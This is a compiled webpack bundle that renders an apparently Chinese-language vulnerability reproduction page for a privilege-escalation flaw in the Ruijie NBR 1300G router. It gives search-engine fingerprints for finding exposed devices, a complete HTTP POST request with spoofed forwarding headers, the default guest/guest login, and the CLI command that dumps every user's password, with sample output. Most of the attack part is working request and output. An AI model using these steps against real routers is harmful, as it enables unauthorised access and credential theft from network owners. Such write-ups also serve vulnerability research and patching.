(window.webpackJsonp=window.webpackJsonp||[]).push([[210],{1591:function(s,a,e){s.exports=e.p+"assets/img/ruijie-35.f583913a.png"},1592:function(s,a,e){s.exports=e.p+"assets/img/ruijie-36.c7210efc.png"},1593:function(s,a,e){s.exports=e.p+"assets/img/ruijie-37.05d0c8cb.png"},3047:function(s,a,e){"use strict";e.r(a);var t=e(64),n=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"锐捷-nbr-1300g路由器-越权cli命令执行漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#锐捷-nbr-1300g路由器-越权cli命令执行漏洞"}},[s._v("#")]),s._v(" 锐捷 NBR 1300G路由器 越权CLI命令执行漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("锐捷NBR 1300G路由器 越权CLI命令执行漏洞，guest账户可以越权获取管理员账号密码")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("锐捷NBR路由器")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('title="锐捷网络 --NBR路由器--登录界面"')]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('app="Ruijie-NBR路由器"\t')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登录页面如下")]),s._v(" "),a("p",[a("img",{attrs:{src:e(1591),alt:"img"}})]),s._v(" "),a("p",[s._v("查看流量发现 CLI命令流量")]),s._v(" "),a("p",[a("img",{attrs:{src:e(1592),alt:"img"}})]),s._v(" "),a("p",[s._v("请求包为")]),s._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[s._v("POST /WEB_VMS/LEVEL15/ HTTP/1.1\nHost: \nConnection: keep-alive\nContent-Length: 73\nAuthorization: Basic\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\nContent-Type: text/plain;charset=UTF-8\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6\nCookie: auth=; user=\nx-forwarded-for: 127.0.0.1\nx-originating-ip: 127.0.0.1\nx-remote-ip: 127.0.0.1\nx-remote-addr: 127.0.0.1\n\ncommand=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("p",[s._v("测试发现执行其他命令需要权限，查看手册发现存在低权限 guest账户（guest/guest）")]),s._v(" "),a("p",[s._v("登录后发送请求包，执行CLI命令 "),a("code",[s._v("(show webmaster user)")]),s._v(" 查看用户配置账号密码")]),s._v(" "),a("p",[a("img",{attrs:{src:e(1593),alt:"img"}})]),s._v(" "),a("p",[s._v("成功获取所有用户的账号密码")]),s._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[s._v("webmaster level 0 username admin password guest\nwebmaster level 0 username guest password guest\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h2",{attrs:{id:""}},[a("a",{staticClass:"header-anchor",attrs:{href:"#"}},[s._v("#")])])],1)}),[],!1,null,null,null);a.default=n.exports}}]);